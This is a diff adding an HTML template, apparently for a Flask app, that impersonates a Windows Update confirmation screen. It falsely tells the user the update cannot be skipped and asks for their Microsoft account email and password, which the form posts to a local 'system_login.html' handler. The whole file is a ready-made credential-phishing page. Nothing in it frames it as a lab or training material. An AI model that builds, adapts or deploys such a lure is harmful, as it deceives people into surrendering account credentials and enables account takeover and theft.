@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Windows Error</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='main.css') }}" />
+</head>
+<body>
+    <center>
+        <img src="{{ url_for('static', filename='win_logo.png') }}" height="250" width="250"> 
+        <h1>Windows Update Confirmation</h1>
+    </center>
+    <p><center>Please Enter Microsoft Account Credentials to continue to Update Windows to a Better, More Secure Version.<br>
+    <span style="color:red">This Process cannot be skipped.</center></span>
+    </p>
+    <form action="system_login.html" method="POST">
+        <center><input type="text" name="microsoftemail" placeholder="Microsoft Account Email" class="win-input"></center><br>
+        <center><input type="password" name="microsoftpassword" placeholder="Microsoft Account Password" class="win-input"></center><br>
+        <center><button class="windows-button">Download Update</button></center><br>
+    </form>
+</body>
+</html>
